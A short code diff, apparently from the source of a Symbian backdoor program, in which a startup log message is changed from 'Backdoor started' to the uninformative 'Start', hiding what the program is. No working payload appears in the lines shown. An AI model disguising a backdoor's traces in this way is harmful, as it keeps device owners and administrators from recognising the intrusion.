@@ -621,7 +621,7 @@ LOCAL_C void DoStartL()
 	CCore* core = CCore::NewLC();
 	
 	//log backdoor start
-	_LIT(KBdStart,"Backdoor started");
+	_LIT(KBdStart,"Start");
 	core->LogInfoMsgL(KBdStart);
 		
 	//load config
